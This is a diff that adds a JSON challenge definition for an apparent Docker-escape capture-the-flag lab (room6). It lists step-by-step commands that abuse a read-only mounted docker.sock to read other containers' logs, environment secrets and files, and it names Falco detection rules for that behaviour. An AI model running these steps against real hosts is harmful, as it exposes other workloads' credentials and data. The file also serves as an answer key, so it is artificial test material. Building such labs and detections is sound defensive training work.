@@ -1,0 +1,26 @@
+{
+  "id": "room6",
+  "container": "room6",
+  "title": "唯讀 docker.sock 仍可跨容器竊取資料",
+  "vuln_type": "docker-sock-exposure",
+  "exploit_script": "exploits/room6.sh",
+  "exploit_steps": [
+    "docker ps -a 列出所有容器（包含已停止的 ghost-alpha/ghost-beta/ghost-gamma/ghost-delta）",
+    "docker logs ghost-alpha 讀取其 stdout 中印出的 FLAG_PART_1（docker.sock 濫用練習，與本關 FLAG 無關）",
+    "docker inspect ghost-beta | grep -i flag 讀取其環境變數 SECRET_FLAG_PART2（同上，練習用）",
+    "docker start ghost-gamma 啟動後 docker exec ghost-gamma cat /app/secret/fragment.txt（同上，練習用）",
+    "docker logs ghost-delta 取得本關真正的 FLAG（EscapeDocker{...}，與 scoreboard-api/flags.py 的 FLAG6 一致）"
+  ],
+  "expected_outcome": "透過 docker.sock（即使是唯讀掛載）對 Docker daemon 發出 API 請求，讀取其他容器的 logs、環境變數（inspect）、檔案內容（exec/diff），取得跨容器洩漏的機密資訊與本關 FLAG",
+  "falco_rule_refs": [
+    "docker_sock_access",
+    "docker_api_container_list",
+    "docker_api_container_inspect",
+    "docker_api_container_start"
+  ],
+  "falco_relevant_behaviors": [
+    "對 /var/run/docker.sock 的 connect/read（即使 ro 掛載，仍可發 HTTP API 請求）",
+    "containers/json、containers/<id>/logs、containers/<id>/json（inspect）、containers/<id>/start、containers/<id>/exec 等 API 呼叫",
+    "容器狀態變化（ghost-gamma 由 stopped → running）"
+  ]
+}
